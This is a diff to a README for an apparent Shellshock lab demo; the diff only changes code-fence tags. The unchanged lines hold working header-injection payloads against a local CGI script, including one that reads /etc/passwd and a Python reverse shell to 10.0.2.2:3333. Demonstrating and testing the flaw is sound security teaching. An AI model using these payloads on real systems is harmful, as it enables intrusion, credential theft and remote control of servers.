@@ -9,9 +9,9 @@
 ## Demoing the vulnerability
 ### To test via the command line: 
 
-```bash
+```sh
 env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
-```bash
+```sh
 
 (If you see "vulnerable" you need to update bash. Otherwise, you should be good to go.)
 
@@ -20,19 +20,19 @@ env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
 
 #### To just echo data:
 
-```bash
+```sh
 curl -H "Useragent: () { :; }; echo \"Content-type: text/plain\"; echo; echo; echo 'hi world of exploits'" http://localhost:8080/cgi-bin/shellshock_test.sh
-```bash
+```sh
 
 #### To copy passwords: 
-```bash
+```sh
 curl -H "Useragent: () { :; }; echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://localhost:8080/cgi-bin/shellshock_test.sh
-```bash
+```sh
 
 #### To create a reverse shell:
-```bash
+```sh
 curl -H "UserAgent: () { :; }; /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.2.2\",3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" http://localhost:8080/cgi-bin/shellshock_test.sh
-```bash
+```sh
 
 
 ## More information about Shellshock: 
